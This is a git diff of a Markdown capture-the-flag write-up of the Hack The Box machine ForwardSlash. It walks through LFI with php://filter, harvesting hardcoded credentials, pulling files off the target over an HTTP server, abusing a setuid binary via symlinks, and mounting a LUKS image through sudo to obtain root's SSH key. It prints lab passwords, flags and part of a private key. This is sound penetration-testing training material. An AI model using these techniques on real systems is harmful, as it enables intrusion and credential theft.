@@ -2,13 +2,13 @@
 
 ## HTB - ForwardSlash
 
-### Overview
+## Overview
 
 ![](../.gitbook/assets/0-forwardslash-infocard.png)
 
 ### Useful Skills and Tools
 
-### Enumeration
+## Enumeration
 
 #### Nmap scan
 
@@ -53,13 +53,15 @@ The Backslash Gang left a message behind:
 
 > Defaced • This was ridiculous, who even uses XML and Automatic FTP Logins
 
-### Dirbuster
+### Dirbuster - forwardslash.htb
+
+![](../.gitbook/assets/1.5-initial-dirbuster.png)
 
 Using Dirbuster found ....  
 
-```text
-dirbuster
-```
+![](../.gitbook/assets/2.5-note.png)
+
+The file `note.txt` mentions two potential usernames: `pain` and `chiv` and also mentions that there is a backup site. 
 
 ### Virtual Host Enumeration
 
@@ -97,7 +99,7 @@ auto-redirects to [http://backup.forwardslash.htb/login.php](http://backup.forwa
 
 
 
-![](../.gitbook/assets/5-fun-fact.png)
+![Breaking the fourth wall](../.gitbook/assets/5-fun-fact.png)
 
 [http://backup.forwardslash.htb/environment.php](http://backup.forwardslash.htb/environment.php) - fun fact with random number of cat-girls saved.
 
@@ -107,45 +109,30 @@ auto-redirects to [http://backup.forwardslash.htb/login.php](http://backup.forwa
 cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.htb/environment.php >> forwardslash.cewl
 ```
 
-always add new sites to cewl word list just in case
+always add new sites to cewl word list just in case, and dirbuster new subdomain
+
+### Dirbuster redux - backup.forwardslash.htb
+
+![](../.gitbook/assets/9-enumerating-backup.png)
+
+There were a lot of results to go through.  I decided to keep going through the ones I saw when I logged in, first.
 
 ![](../.gitbook/assets/6-fileupload.png)
 
 
 
-[http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) can upload files after removing "disabled" attributes
+The URL and Submit sections on the [http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) page were disabled, but I wondered if it was something I could easily bypass by checking the HTML.
 
 ![](../.gitbook/assets/8-disabled.png)
+
+ As I suspected, they had simply used the "disabled" attribute for the two sections.  Removing this code made it so the fields were again active.  
 
 ```text
 <!-- TODO: removed all the code to actually change the picture after backslash gang
  attacked us, simply echos as debug now -->
 ```
 
-### Dirbuster redux
-
-![](../.gitbook/assets/9-enumerating-backup.png)
-
-127.0.1.1
-
-```text
-HTTP/1.1 408 Request Timeout
-Date: Sat, 04 Jul 2020 13:42:37 GMT
-Server: Apache/2.4.29 (Ubuntu)
-Content-Length: 296
-Connection: close
-Content-Type: text/html; charset=iso-8859-1
-
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>408 Request Timeout</title>
-</head><body>
-<h1>Request Timeout</h1>
-<p>Server timeout waiting for the HTTP request from the client.</p>
-<hr>
-<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80</address>
-</body></html>
-```
+### Local File Inclusion testing
 
 used burp to enumerate the potential for LFI
 
@@ -210,9 +197,9 @@ if($link === false){
 ?>
 ```
 
-
-
 I now had what looked to be a password hash for the `www-data` user, but I knew from `/etc/passwd` that the user was not able to log into a shell.  I kept trying for all of the other sites I had seen in my enumeration using dirbuster such as `api.php`, `login.php`, `profilepicture.php` but each time I just got back the message "Permission Denied; not that way ;\)".  The winking smiley and the "not that way" line made it sound as if I was headed in the right direction, but I just needed to try a bit harder.  
+
+### Bypassing web filtering
 
 My initial thought was that there was a web-application firewall, so I searched around a bit until I found [https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/).  I kept looking for more ways after testing different bypass methods, as nothing seemed to even get a response.  I started doing a bit of research into bypassing PHP web filtering and came across a section on `PayloadsAlltheThings` that was made just for this situation with PHP file inclusion.  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)
 
@@ -305,43 +292,17 @@ function ftp_get_string($ftp, $filename) {
 ?>
 ```
 
-Here was the hardcoded FTP-Autologin that the Backslash Gang had so disdained.  I now had credentials for the user `chiv` .I then tried using this username/password combo to SSH into the machine, and was greeted with a shell. 
+Here was the hardcoded FTP-Autologin code that the Backslash Gang had so disdained, and I now had credentials for the user `chiv` .  I then tried using this username/password combo to SSH into the machine, and was greeted with a shell. 
 
-### Initial Foothold
+## Initial Foothold
 
 #### Enumeration as user `chiv`
 
 Unfortunately, this user was not the one with the flag, so I assumed that I would need to move laterally to `pain` in order to get my first score.
 
-```text
-[+] System stats
-Filesystem      Size  Used Avail Use% Mounted on                                                        
-udev            1.9G     0  1.9G   0% /dev
-tmpfs           393M  1.4M  391M   1% /run
-/dev/sda2        20G  6.0G   13G  33% /
-tmpfs           2.0G  168K  2.0G   1% /dev/shm
-tmpfs           5.0M     0  5.0M   0% /run/lock
-tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
-/dev/loop0       92M   92M     0 100% /snap/core/8689
-/dev/loop1       90M   90M     0 100% /snap/core/8268
-tmpfs           393M     0  393M   0% /run/user/1001
-```
+linpeas.sh my go-to enumeration all-in-one script
 
-open ports
-
-```text
-Active Internet connections (servers and established)                                                   
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      1 10.10.10.183:49396      8.8.4.4:53              SYN_SENT    -                   
-tcp        0    624 10.10.10.183:22         10.10.15.82:45984       ESTABLISHED -                   
-tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-udp        0      0 127.0.0.1:51573         127.0.0.53:53           ESTABLISHED -                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*
-```
+open ports -nope
 
 users
 
@@ -352,7 +313,7 @@ pain:x:1000:1000:pain:/home/pain:/bin/bash
 root:x:0:0:root:/root:/bin/bash
 ```
 
-/usr/bin/pkexec chfn \(chsh\) usr/bin/backup
+usr/bin/backup
 
 ```text
 [+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
@@ -366,7 +327,9 @@ define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtd
 $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 ```
 
-### Road to User
+### The python script
+
+I had access to `pain`'s home folder, which was a bit unusual.  Inside was another note, and a python script with some ciphertext in the `encryptorinator/` folder.  
 
 ```text
 chiv@forwardslash:/home/pain$ ls
@@ -384,31 +347,37 @@ drwxr-xr-x 7 pain pain 4096 Mar 17 20:28 ..
 -rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
 ```
 
-exfiltrate to my machine
+I exfiltrated the two files to my machine to make analysis easier.
 
 ```text
 chiv@forwardslash:/home/pain/encryptorinator$ python -m SimpleHTTPServer 8099
 Serving HTTP on 0.0.0.0 port 8099 ...
-10.10.15.82 - - [06/Jul/2020 14:05:44] code 404, message File not found
-10.10.15.82 - - [06/Jul/2020 14:05:44] "GET /encryptor.py HTTP/1.1" 404 -
 10.10.15.82 - - [06/Jul/2020 14:05:56] "GET /encrypter.py HTTP/1.1" 200 -
 10.10.15.82 - - [06/Jul/2020 14:06:07] "GET /ciphertext HTTP/1.1" 200 -
 ```
 
-python script is redacted
+The python script `encrypter.py` was redacted, and no longer contained the code to decrypt the ciphertext.  
 
 ```text
 print encrypt('REDACTED', 'REDACTED')
 print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
 ```
 
-lets check the backups we saw and see if the whole script is available
+At first, I thought "lets check the backups I saw while enumerating with linpeas and see if the whole script is available".  _\(By the way, there is no "whole script" and you could go ahead and decrypt it right now.\)_
+
+## Road to User
+
+### Further enumeration
+
+In the `/usr/bin/` folder there was an interesting program that stuck out to me.
 
 ```text
 -r-sr-xr-x  1 pain   pain       13384 Mar  6 10:06  backup
 ```
 
-has suid bit set but is owned by pain. If we can switch to this user may be able to use this binary to privesc
+This program had the setuid bit set and was owned by `pain`. I thought that I may be able to use this binary to escalate privileges laterally to `pain`.
+
+In the `/var/backups` folder, I found a bunch of files that had been backed up, as well as another note from `pain`.  
 
 ```text
 chiv@forwardslash:/var/backups$ ls -la
@@ -433,34 +402,15 @@ drwxr-xr-x 14 root root             4096 Mar  5 14:25 ..
 drwxrwx---  2 root backupoperator   4096 May 27  2019 recovery
 -rw-------  1 root shadow           1174 Mar  6 14:21 shadow.bak
 chiv@forwardslash:/var/backups$ cat note.txt 
+
 Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.
 
 -Pain
 ```
 
--rw------- 1 pain pain 526 Jun 21 2019 config.php.bak
+I assumed he was talking about this file: `-rw------- 1 pain pain 526 Jun 21 2019 config.php.bak` since I had found another password in the `config.php` file on the backup site earlier.  Perhaps this password was not encrypted like the previous one.  
 
-recieved `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 932: invalid continuation byte` while trying to decrypt. \(have seen this with rockyou.txt in the past as well\)
-
-[https://github.com/wpscanteam/wpscan/issues/190](https://github.com/wpscanteam/wpscan/issues/190) - encoding problems with rockyou.txt and ciphertext solved by using `'latin'` encoding
-
-```text
-zweilos@kalimaa:~/htb/forwardslash$ vi -c 'let $enc = &fileencoding | execute "!echo Encoding:  $enc" | q' ciphertext 
-
-Encoding: latin1
-
-Press ENTER or type command to continue
-```
-
-ouput
-
-```text
-zweilos@kalimaa:~/htb/forwardslash$ python3 ./decryptor.py
-plaintext found: ©¹b`ÛºK§T=ox&yorSÔaé[8vá[(ý;fryption tool, pretty secure hÏäþð5ÖMG3õzhere is the key to the encrypted image from /var/backups/recovery: cB!6%sdHòj^@Y*$C2cf
-The key was: theroadtorainbows
-```
-
-unfortunately neither of these are `pain`'s or the root password, and we do not have access to `/var/backups/recovery`. Will need to go back and check out that `backup` binary again. Since its in path I just ran it.
+and we do not have access to `/var/backups/recovery`. Will need to go back and check out that `backup` binary again. Since its in $PATH I just ran it.
 
 ```text
 chiv@forwardslash:~$ backup
@@ -475,11 +425,11 @@ Current Time: 17:14:04
 ERROR: d09b25378e01dd1af648dca8a641e52e Does Not Exist or Is Not Accessible By Me, Exiting...
 ```
 
-hmmm...its looking for the hash of something, and says something about only working if the backup is taken in the same second, and displays the time. After some experimentation, discovered that the hash is an md5 hash of the current time in `HH:MM:SS` format. `echo $(date +%T) | md5sum | cut -c1-32` will get me a hash of the time that matches the time in the backup program, now need to script reading the file and sending the hash at the same time
+hmmm...its looking for the hash of something, and says something about only working if the backup is taken in the same second, and displays the time. After some experimentation, discovered that the hash is an md5 hash of the current time in `HH:MM:SS` format. `echo $(date +%T) | md5sum | cut -c1-32` will get me a hash of the time that matches the time in the backup program, now need to script reading the file and sending the hash at the same time \(`cut` because md5sum adds  `- <filename>`at the end of its output\). 
 
 Try it on the config backup. I had seen a long hash in the one I found before, maybe this one is pre-encryption.
 
-Oooohhhh...need to make a symbolic link of the file, to the proper hash; also don't need to call backup on the file, just run it in the directory you want it to work on
+Oooohhhh...need to make a symbolic link of the file, to the proper hash; also don't need to call `backup` ON the file, just run it in the directory you want it to work in
 
 After much trial and error: getting the hash of the time wasn't working \(machine or network lag perhaps?\) so I decided to pull the hash directly from the program and symlink the backup file to it
 
@@ -498,9 +448,7 @@ File cannot be opened.
 
 after some more trial and error...found out that the script must be executed from user's home directory. Successfully got my test file to be read. Next, the config backup/.
 
-#### Further enumeration
-
-#### Finding user creds
+### Finding user creds
 
 ```text
 chiv@forwardslash:~$ /dev/shm/bak.sh 
@@ -541,9 +489,11 @@ pain@forwardslash:~$ cat user.txt
 cd2c04d272619fd6777527f19fd38cf8
 ```
 
-### Path to Power \(Gaining Administrator Access\)
+## Path to Power \(Gaining Administrator Access\)
 
-#### Enumeration as User
+### Enumeration as User `pain`
+
+Enumeration as this user was pretty short, since I had already found most everything as `chiv`.  As I always to when logging in as a new user, I checked my privileges with `sudo -l` and `groups`.
 
 ```text
 pain@forwardslash:/var/backups/recovery$ sudo -l
@@ -555,23 +505,119 @@ User pain may run the following commands on forwardslash:
     (root) NOPASSWD: /sbin/cryptsetup luksOpen *
     (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
     (root) NOPASSWD: /bin/umount ./mnt/
+pain@forwardslash:~$ groups
+pain backupoperator
 ```
 
-since I had already decrypted the backup password earlier with my python script this part was fairly straightforward.
+The `backupoperator` group sounded familiar.  I had seen it earlier on a folder I couldn't access in `/var/backups`. 
 
-from [http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html](http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html).
-
-> luksOpen   \(old syntax\)
+### The encrypted backup file
 
 ```text
-          Opens the LUKS device <device> and  sets  up  a  mapping  <name>  after  successful
-          verification  of  the  supplied  passphrase.  If the passphrase is not supplied via
-          --key-file, the command prompts for it interactively.
+pain@forwardslash:/var/backups$ cd recovery/
+pain@forwardslash:/var/backups/recovery$ ls -la
+total 976576
+drwxrwx--- 2 root backupoperator       4096 Jul  6 19:35 .
+drwxr-xr-x 3 root root                 4096 Jul  6 06:25 ..
+-rw-r----- 1 root backupoperator 1000000000 Jul  6 19:35 encrypted_backup.img
 ```
 
-The commands we are allowed to use with sudo spell out what we can do. the device name will be our backup file, the `<name>` will be `backup` \(command says `/bin/mount /dev/mapper/backup ./mnt/`\) and we will need to make a directory called ./mnt/
+ I navigated to this folder and found the file `encrypted_backup.img`.  This had to be the backup file that `pain` had `sudo` rights to manipulate.  
 
-#### Getting a shell
+When trying to use `luksOpen` to decrypt the backup file, however, it prompted me for a passphrase.  The note in `pain`'s home folder had mentioned some "crypto magic" that had been applied to the key, so I went back to try to decrypt that ciphertext with the python script. 
+
+### Python decryption script revisited
+
+Working on script, lots of trial and error
+
+#### Fixing UnicodeDecodeError in Python scripts
+
+```text
+UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 932: invalid continuation byte
+```
+
+recieved error: while trying to decrypt. \(have seen this with rockyou.txt in the past as well\).  [https://github.com/wpscanteam/wpscan/issues/190](https://github.com/wpscanteam/wpscan/issues/190) - encoding problems with rockyou.txt and ciphertext solved by using `'latin'` encoding
+
+```text
+zweilos@kalimaa:~/htb/forwardslash$ vi -c 'let $enc = &fileencoding | execute "!echo Encoding:  $enc" | q' ciphertext 
+
+Encoding: latin1
+
+Press ENTER or type command to continue
+```
+
+final script:
+
+```python
+import string
+
+def decrypt(key, msg):
+  lkey = list(key)
+  lmsg = list(msg)
+  for char_key in reversed(lkey):
+      for i in reversed(range(len(lmsg))):
+          if i == 0:
+              tmp = ord(lmsg[i]) - (ord(char_key) + ord(lmsg[-1]))
+          else:
+              tmp = ord(lmsg[i]) - (ord(char_key) + ord(lmsg[i-1]))
+          while tmp < 0:
+              tmp += 256
+          if tmp > 256:
+            tmp = 105 #randomly picked to fix out-of-range chars
+          elif tmp == 0:
+            tmp = 90 #randomly picked to fix out-of-range chars
+          lmsg[i] = chr(tmp)
+  return ''.join(lmsg)
+
+#checks the output from crypto and sees if at least 60% is ascii letters and returns true for possible plaintext
+def is_plaintext(ptext):
+    num_letters = sum(map(lambda x : 1 if x in string.ascii_letters else 0, ptext))
+    if num_letters / len(ptext) >= .6:
+      return True
+
+def main():
+  with open('ciphertext', 'r', encoding='latin1') as ctext, open('key', 'r', encoding='latin1') as rock:
+      cipher = ctext.read()
+      #print(cipher + ': ' + str(len(cipher))) #for testing that the cypher is being read properly.  Needed latin encoding, as UTF-8 invalid
+
+      for line in rock:
+        line = line.strip() #remove any spaces or newlines
+        #print('trying: ' + line) #testing file read purposes...too many lines of output to keep
+
+        ptext = decrypt(line, cipher)
+        
+        #only print the result if it contains > 60% letters, can be tweaked.
+        if is_plaintext(ptext): 
+          print('plaintext found: ' + ptext)
+          print('The key was: ' + line)
+          exit() #exit on positive result. Remove if false positives.
+        
+if (__name__ == '__main__'): 
+  try: 
+      main() 
+  except KeyboardInterrupt: 
+      exit()
+```
+
+Python script ouput
+
+```text
+zweilos@kalimaa:~/htb/forwardslash$ python3 ./decryptor.py
+plaintext found: ©¹b`ÛºK§T=ox&yorSÔaé[8vá[(ý;fryption tool, pretty secure hÏäþð5ÖMG3õzhere is the key to the encrypted image from /var/backups/recovery: cB!6%sdHòj^@Y*$C2cf
+The key was: theroadtorainbows
+```
+
+Since I had now done the hard part and decrypted the backup password with my python script, the next part was fairly straightforward.  The commands we are allowed to use with sudo spell out what we can do. 
+
+From the CryptSetup man page: [http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html](http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html).
+
+> luksOpen   \(old syntax\)
+>
+>           Opens the LUKS device &lt;device&gt; and  sets  up  a  mapping  &lt;name&gt;  after  successful          verification  of  the  supplied  passphrase.  If the passphrase is not supplied via --key-file, the command prompts for it interactively.
+
+the device name will be our backup file, the `<name>` will be `backup` \(command says `/bin/mount /dev/mapper/backup ./mnt/`\) and we will need to make a directory called ./mnt/
+
+### Getting a shell
 
 ```text
 pain@forwardslash:/var/backups/recovery$ sudo cryptsetup luksOpen encrypted_backup.img backup
@@ -610,9 +656,11 @@ ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
 -----END RSA PRIVATE KEY-----
 ```
 
+I now had an SSH key.  Since neither `pain` or `chiv` needed an RSA key to login using SSH I assumed this was `root`'s private key.
+
 #### Root.txt
 
-As always, make sure to apply `chmod 600 <file>` to your ssh private keys!
+Trying to login with this key, I encountered an error I had seen before.
 
 ```text
 zweilos@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@10.10.10.183
@@ -625,8 +673,13 @@ It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "root.id_rsa": bad permissions
 root@10.10.10.183's password: 
+```
 
+I knew I was right that this was root's key.  _Though, as always, you have to make sure to apply `chmod 600 <file>` to your SSH private keys before use!_
+
+```text
 zweilos@kalimaa:~/htb/forwardslash$ chmod 600 root.id_rsa 
+
 zweilos@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@10.10.10.183
 load pubkey "root.id_rsa": invalid format
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
@@ -634,7 +687,7 @@ root@forwardslash:~# cat root.txt
 a6a94932e6c6b3d237b147c5abca2287
 ```
 
-and...root.
+and...root.  While logging in, I received the error `load pubkey "root.id_rsa": invalid format`, though it didn't cause any issues.  According to [https://askubuntu.com/questions/698997/key-load-public-invalid-format-with-scp-or-git-clone-on-ubuntu-15-10/700172\#700172](https://askubuntu.com/questions/698997/key-load-public-invalid-format-with-scp-or-git-clone-on-ubuntu-15-10/700172#700172) this happens when the public key is missing or corrupted.  In this case it wasn't present, therefore the error.
 
 Thanks to [`InfoSecJack`](https://www.hackthebox.eu/home/users/profile/52045) [`chivato`](https://www.hackthebox.eu/home/users/profile/44614)& for &lt;something interesting or useful about this machine.
 
